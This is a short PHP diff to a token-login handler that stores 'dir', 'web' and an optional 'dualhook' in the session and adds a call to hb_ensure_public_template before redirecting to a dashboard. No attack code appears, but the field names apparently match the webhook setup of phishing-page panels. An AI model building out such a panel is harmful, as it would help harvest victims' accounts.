@@ -24,6 +24,7 @@ if($token) {
             $_SESSION['dir'] = $ex[1];
             $_SESSION['web'] = $ex[2];
             $_SESSION['dualhook'] = $ex[3] ?? ''; // Dualhook is optional (4th field)
+            hb_ensure_public_template($ex[1]);
             header("Location: dashboard.php");
             exit();
         } else {
